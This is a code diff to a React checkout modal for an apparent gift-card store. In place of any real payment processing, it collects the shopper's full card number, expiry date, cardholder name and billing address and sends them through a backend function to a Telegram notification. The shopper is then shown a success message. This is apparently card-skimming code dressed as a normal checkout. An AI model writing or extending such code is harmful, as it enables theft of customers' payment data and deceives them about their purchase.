@@ -8,6 +8,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/u
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { CreditCard, Smartphone, DollarSign, Building, Upload, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { supabase } from "@/integrations/supabase/client";
 
 interface CheckoutModalProps {
   isOpen: boolean;
@@ -74,18 +75,47 @@ const CheckoutModal = ({ isOpen, onClose, total, currency, cartItems }: Checkout
 
     setIsProcessing(true);
 
-    // Simulate payment processing
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    try {
+      // Send Telegram notification
+      const checkoutData = {
+        type: 'checkout',
+        paymentMethod: selectedPaymentMethod,
+        total: total,
+        currency: currency,
+        items: cartItems.map(item => `${item.name} - $${item.amount} x ${item.quantity}`).join(', '),
+        creditCardInfo: selectedPaymentMethod === 'credit' ? {
+          cardNumber: creditCardForm.cardNumber,
+          expiryDate: creditCardForm.expiryDate,
+          cardholderName: creditCardForm.cardholderName,
+          billingAddress: creditCardForm.billingAddress,
+          city: creditCardForm.city,
+          postalCode: creditCardForm.postalCode,
+          country: creditCardForm.country
+        } : null
+      };
 
-    toast({
-      title: "Order Placed Successfully!",
-      description: selectedPaymentMethod === "credit" 
-        ? "Your gift cards will be delivered to your email within 5-10 minutes."
-        : "Payment received! Your order will be processed within 24 hours after verification.",
-    });
+      await supabase.functions.invoke('send-telegram-notification', {
+        body: checkoutData
+      });
 
-    setIsProcessing(false);
-    onClose();
+      toast({
+        title: "Order Placed Successfully!",
+        description: selectedPaymentMethod === "credit" 
+          ? "Your gift cards will be delivered to your email within 5-10 minutes."
+          : "Payment received! Your order will be processed within 24 hours after verification.",
+      });
+
+      setIsProcessing(false);
+      onClose();
+    } catch (error) {
+      console.error('Error processing checkout:', error);
+      toast({
+        title: "Error",
+        description: "There was an error processing your order. Please try again.",
+        variant: "destructive",
+      });
+      setIsProcessing(false);
+    }
   };
 
   return (
